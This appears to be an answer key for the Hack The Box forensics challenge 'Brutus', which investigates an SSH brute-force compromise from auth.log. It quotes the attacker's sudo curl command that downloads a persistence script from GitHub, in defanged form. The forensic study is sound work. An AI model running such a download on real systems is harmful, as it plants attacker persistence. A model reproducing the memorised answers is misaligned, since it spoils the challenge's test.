# Brutus

Hack the Box Link: [Brutus](https://app.hackthebox.com/sherlocks/Brutus/play)

1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
* *Answer*: 65.2.161.68

2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
* *Answer*: root

3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
* *Answer*: 2024-03-06 06:32:45

4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
* *Answer*: 37

5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
* Answer*: cyberjunkie

6. What is the MITRE ATT&CK sub-technique ID used for persistence?
* *Answer*: T1136.001

7. How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
* *Answer*: 279

8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
* *Answer*: /usr/bin/curl https[:]//raw[.]githubusercontent.com/montysecurity/linper/main/linper[.]sh

